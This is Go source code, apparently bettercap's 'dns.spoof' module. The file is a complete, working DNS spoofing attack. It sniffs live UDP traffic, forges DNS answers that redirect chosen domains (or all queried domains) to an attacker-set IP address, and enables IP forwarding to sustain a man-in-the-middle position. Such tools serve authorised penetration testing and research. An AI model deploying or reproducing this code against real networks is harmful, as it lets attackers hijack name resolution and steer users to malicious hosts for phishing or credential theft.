package dns_spoof

import (
	"bytes"
	"fmt"
	"net"
	"sync"

	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/evilsocket/islazy/tui"
)

type DNSSpoofer struct {
	session.SessionModule
	Handle        *pcap.Handle
	Hosts         Hosts
	All           bool
	waitGroup     *sync.WaitGroup
	pktSourceChan chan gopacket.Packet
}

func NewDNSSpoofer(s *session.Session) *DNSSpoofer {
	mod := &DNSSpoofer{
		SessionModule: session.NewSessionModule("dns.spoof", s),
		Handle:        nil,
		All:           false,
		Hosts:         Hosts{},
		waitGroup:     &sync.WaitGroup{},
	}

	mod.AddParam(session.NewStringParameter("dns.spoof.hosts",
		"",
		"",
		"If not empty, this hosts file will be used to map domains to IP addresses."))

	mod.AddParam(session.NewStringParameter("dns.spoof.domains",
		"",
		"",
		"Comma separated values of domain names to spoof."))

	mod.AddParam(session.NewStringParameter("dns.spoof.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"IP address to map the domains to."))

	mod.AddParam(session.NewBoolParameter("dns.spoof.all",
		"false",
		"If true the module will reply to every DNS request, otherwise it will only reply to the one targeting the local pc."))

	mod.AddHandler(session.NewModuleHandler("dns.spoof on", "",
		"Start the DNS spoofer in the background.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("dns.spoof off", "",
		"Stop the DNS spoofer in the background.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod DNSSpoofer) Name() string {
	return "dns.spoof"
}

func (mod DNSSpoofer) Description() string {
	return "Replies to DNS messages with spoofed responses."
}

func (mod DNSSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (mod *DNSSpoofer) Configure() error {
	var err error
	var hostsFile string
	var domains []string
	var address net.IP

	if mod.Running() {
		return session.ErrAlreadyStarted
	} else if mod.Handle, err = pcap.OpenLive(mod.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
		return err
	} else if err = mod.Handle.SetBPFFilter("udp"); err != nil {
		return err
	} else if err, mod.All = mod.BoolParam("dns.spoof.all"); err != nil {
		return err
	} else if err, address = mod.IPParam("dns.spoof.address"); err != nil {
		return err
	} else if err, domains = mod.ListParam("dns.spoof.domains"); err != nil {
		return err
	} else if err, hostsFile = mod.StringParam("dns.spoof.hosts"); err != nil {
		return err
	}

	mod.Hosts = Hosts{}
	for _, domain := range domains {
		mod.Hosts = append(mod.Hosts, NewHostEntry(domain, address))
	}

	if hostsFile != "" {
		mod.Info("loading hosts from file %s ...", hostsFile)
		if err, hosts := HostsFromFile(hostsFile, address); err != nil {
			return fmt.Errorf("error reading hosts from file %s: %v", hostsFile, err)
		} else {
			mod.Hosts = append(mod.Hosts, hosts...)
		}
	}

	if len(mod.Hosts) == 0 {
		return fmt.Errorf("at least dns.spoof.hosts or dns.spoof.domains must be filled")
	}

	for _, entry := range mod.Hosts {
		mod.Info("%s -> %s", entry.Host, entry.Address)
	}

	if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("enabling forwarding.")
		mod.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (mod *DNSSpoofer) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, address net.IP, req *layers.DNS, target net.HardwareAddr) {
	redir := fmt.Sprintf("(->%s)", address.String())
	who := target.String()

	if t, found := mod.Session.Lan.Get(target.String()); found {
		who = t.String()
	}

	mod.Info("sending spoofed DNS reply for %s %s to %s.", tui.Red(domain), tui.Dim(redir), tui.Bold(who))

	var err error
	var src, dst net.IP

	nlayer := pkt.NetworkLayer()
	if nlayer == nil {
		mod.Debug("missing network layer skipping packet.")
		return
	}

	var eType layers.EthernetType
	var ipv6 bool

	if nlayer.LayerType() == layers.LayerTypeIPv4 {
		pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = false
		eType = layers.EthernetTypeIPv4

	} else {
		pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = true
		eType = layers.EthernetTypeIPv6
	}

	eth := layers.Ethernet{
		SrcMAC:       peth.DstMAC,
		DstMAC:       target,
		EthernetType: eType,
	}

	answers := make([]layers.DNSResourceRecord, 0)
	for _, q := range req.Questions {
		answers = append(answers,
			layers.DNSResourceRecord{
				Name:  []byte(q.Name),
				Type:  q.Type,
				Class: q.Class,
				TTL:   1024,
				IP:    address,
			})
	}

	dns := layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
		QDCount:   req.QDCount,
		Questions: req.Questions,
		Answers:   answers,
	}

	var raw []byte

	if ipv6 {
		ip6 := layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolUDP,
			HopLimit:   64,
			SrcIP:      src,
			DstIP:      dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip6)

		err, raw = packets.Serialize(&eth, &ip6, &udp, &dns)
		if err != nil {
			mod.Error("error serializing packet: %s.", err)
			return
		}
	} else {
		ip4 := layers.IPv4{
			Protocol: layers.IPProtocolUDP,
			Version:  4,
			TTL:      64,
			SrcIP:    src,
			DstIP:    dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip4)

		err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
		if err != nil {
			mod.Error("error serializing packet: %s.", err)
			return
		}
	}

	mod.Debug("sending %d bytes of packet ...", len(raw))
	if err := mod.Session.Queue.Send(raw); err != nil {
		mod.Error("error sending packet: %s", err)
	}
}

func (mod *DNSSpoofer) onPacket(pkt gopacket.Packet) {
	typeEth := pkt.Layer(layers.LayerTypeEthernet)
	typeUDP := pkt.Layer(layers.LayerTypeUDP)
	if typeEth == nil || typeUDP == nil {
		return
	}

	eth := typeEth.(*layers.Ethernet)
	if mod.All || bytes.Equal(eth.DstMAC, mod.Session.Interface.HW) {
		dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
		if parsed && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
			udp := typeUDP.(*layers.UDP)
			for _, q := range dns.Questions {
				qName := string(q.Name)
				if address := mod.Hosts.Resolve(qName); address != nil {
					mod.dnsReply(pkt, eth, udp, qName, address, dns, eth.SrcMAC)
					break
				} else {
					mod.Debug("skipping domain %s", qName)
				}
			}
		}
	}
}

func (mod *DNSSpoofer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, func() {
		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		src := gopacket.NewPacketSource(mod.Handle, mod.Handle.LinkType())
		mod.pktSourceChan = src.Packets()
		for packet := range mod.pktSourceChan {
			if !mod.Running() {
				break
			}

			mod.onPacket(packet)
		}
	})
}

func (mod *DNSSpoofer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.pktSourceChan <- nil
		mod.Handle.Close()
		mod.waitGroup.Wait()
	})
}
